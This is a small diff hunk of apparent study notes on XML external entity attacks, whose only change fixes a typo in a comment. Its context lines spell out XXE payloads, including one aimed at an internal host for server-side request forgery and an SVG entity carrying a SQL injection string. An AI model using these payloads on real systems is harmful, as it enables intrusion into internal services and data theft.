@@ -29,7 +29,7 @@
 // &fileContents;
 //* to perform SSRF attacks
 // <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
-// if it does not get a file content if gets the folder name
+// if it does not get a file content it gets the folder name
 
 // <!DOCTYPE svg [
 //   <!ENTITY xxe SYSTEM "http://localhost:5000/search?q='union/**/select/**/*/**/from/**/_696fca451a1e8daf--">
